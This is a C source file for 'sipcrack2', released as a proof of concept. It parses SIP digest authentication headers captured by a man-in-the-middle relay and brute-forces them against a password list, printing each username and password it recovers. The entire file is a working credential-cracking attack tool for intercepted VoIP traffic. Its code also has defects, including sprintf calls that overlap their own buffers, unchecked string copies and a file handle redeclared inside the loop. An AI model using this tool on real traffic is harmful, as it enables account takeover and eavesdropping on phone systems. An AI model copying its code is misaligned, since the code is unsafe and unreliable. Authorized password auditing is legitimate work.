//this tool parses the output of mitm_relay.py and extracts the digest attributes
//after this extraction, it performs the brute force based password cracking
//it simply iterates through the password list , calculates the digest hash and compares
//against extracted response
// v0.1 - i am sure it can be optimised further and may contain bugs

//PoC released on 14th Apr 2019
#include <stdio.h>
#include <string.h>
#include <openssl/md5.h>
#include <unistd.h>

int i=0,j=0,indeks,indeks2;
int i2,j2,rfc2617=0;
char username[100],filename[100],filename2[100],line[256],password[100],method[10],uri[100],nonce[100];
char nc[100],cnonce[100],username_helper[100],username_helper2[100],username_helper3[100],realm[100],qop[100],response[100];
char helper[200];
char *e,*e2,*ret;
short passFound=0;

MD5_CTX c,d;
char string [100];
unsigned char array[16];
unsigned char out2[MD5_DIGEST_LENGTH],out[MD5_DIGEST_LENGTH];
char h1[200],h2[200];
int n,k=0;

char allusers[100][100],allpasswords[100][100];
int number_of_users=0;

void formatstring(int n,char *h2,unsigned char *out2)
{
	for (n=0;n<MD5_DIGEST_LENGTH;n++)
		sprintf(&h2[n*2],"%02x",(unsigned int)out2[n]);
}

void md5calculate (MD5_CTX c,char *string,unsigned char *array)
{
	MD5_Init(&c);
	MD5_Update(&c,string,strlen(string));
	MD5_Final(array,&c);
}

void extract_string2 (char *line,int i,int i2, int j, char *helper)
{
char terminator,terminator2;
			j=0;
			if (rfc2617==0)
				terminator='"';
			else 
			{
				terminator=',' ; 
				terminator2='\n';
			}			
			for (i=i2;(line[i]!=terminator && line[i]!=terminator2);++i)
			{
				helper[j]=line[i];
				j++;
			}
			helper[j]='\0';
		
}


int main (int argc, char * argv[])
{
char helper2[200];

	printf ("sipcrack2 -V0.1 by Ivica Stipovic\n");
	printf ("A mitm_relay file parser and password cracker\n");
	printf ("A Supplement to sipdump.py and sipcrack.py\n");
	printf ("=========================================\n");
	if (argc!=3) 
	{
		printf ("usage: %s <sipdump file> <password list> \n",argv[0]);
		return(0);
	}

		strcpy(filename, argv[1]);
		printf ("filename=%s\n",filename);
		FILE *file=fopen (filename,"r");

	if (file==NULL)
	{
		printf ("Error opening dump file %s\n",filename);
		return (0);
	}	
		strcpy (filename2,argv[2]);
		FILE *file2=fopen(filename2,"r");

	if (file2==NULL)
	{
		printf ("error opening pasword file %s\n",filename);
		return (0);
	}
	while (fgets(line,sizeof(line),file)!=NULL)
	{

		if (strncmp(line,"REGISTER",8)==0)
			strcpy (method,"REGISTER");
		else 
		if (strncmp(line,"INVITE",6)==0)
			strcpy (method,"INVITE");
		else
		if (strncmp(line,"SUBSCRIBE",9)==0)
			strcpy (method,"SUBSCRIBE");

		if (strncmp(line,"Authorization",13)==0)
		{
			ret=strstr (line,"username");
			indeks=ret-line;	
			i2=indeks+10;
			extract_string2(line,i,i2,j,helper);		
			strcpy (username, helper);	
		
				
		//detecting realm
			ret=strstr(line,"realm");
			indeks=ret-line;
			i2=indeks+7;
			extract_string2(line,i,i2,j,helper);
			strcpy (realm, helper);	
		
		//detecting response
			ret=strstr(line,"response");
			indeks=ret-line;
			i2=indeks+10;
			extract_string2(line,i,i2,j,helper);
			strcpy (response, helper);	
		//detecting uri
			ret=strstr(line,"uri");
			indeks=ret-line;
			i2=indeks+5;
			extract_string2(line,i,i2,j,helper);			
			strcpy (uri, helper);	
		
		//detecting nonce
			ret=strstr(line,"nonce");
			indeks=ret-line;
			i2=indeks+7;
			extract_string2(line,i,i2,j,helper);
			strcpy (nonce, helper);	
		
		//detecting qop
			ret=strstr (line,"qop");			
			if (ret!=NULL)
			{
						
				rfc2617=1;
				indeks=ret-line;
				i2=indeks+4;
				extract_string2(line,i,i2,j,helper);
				strcpy (qop, helper);	
				
				ret=strstr(line,"nc=");
				indeks=ret-line;
				i2=indeks+3;
				extract_string2(line,i,i2,j,helper);
				strcpy (nc, helper);	
				
				rfc2617=0;
				ret=strstr(line,"cnonce");
				indeks=ret-line;
				i2=indeks+8;
				extract_string2(line,i,i2,j,helper);
				strcpy (cnonce, helper);	
				rfc2617=1;
			}
			else
			{
			rfc2617=0;
			}
			
		i=0;
		i2=0;
		
		//format strings and calculate H1 and H2
		strcpy (username_helper2,username);
		sprintf (username,"%s:%s:",username,realm);
		sprintf (method,"%s:%s",method,uri);
		strcpy (username_helper,username);
		
		while (fgets(line,sizeof(line),file2)!=NULL)
		{
			strcpy (password,line);
			strcat (username,password);	
	
			username[strcspn(username,"\n")]=0;	

			md5calculate (c,username,out);
			formatstring(n,h1,out);

			md5calculate (d,method,out2);
			formatstring(n,h2,out2);

			if (rfc2617==1)
			{	
					sprintf (h1,"%s:%s:%s:%s:%s:%s",h1,nonce,nc,cnonce,qop,h2);
					md5calculate (c,h1,out);
					formatstring (n,h1,out);
			}
			else
			{
					sprintf(h1,"%s:%s:%s",h1,nonce,h2);
					md5calculate (c,h1,out);
					formatstring (n,h1,out);
			}
	
			if ( strcmp(h1,response)==0)
			{
					passFound=1;	
					strcpy (allusers[number_of_users],username_helper2);	
					strcpy (allpasswords[number_of_users],password);
					number_of_users++;
				
			}	
			
			strcpy (username,username_helper);
		
		}
		fclose(file2);
		FILE *file2=fopen(filename2,"r");
		}
		}
		fclose(file);
				
		for (k=0;k!=number_of_users-1;k++) 
		{
			for (j=k+1;j!=number_of_users;j++)
			{
				if (strcmp(allusers[k],allusers[j])==0) 
				strcpy (allusers[j],"");
			}	
		}				
		for (k=0;k!=number_of_users;k++) 
									
				if (strcmp(allusers[k],"")!=0)	printf ("USERNAME: %s / PASSWORD: %s\n",allusers[k],allpasswords[k]);
											
		if (passFound==0) printf ("No passwords found\n");
	}
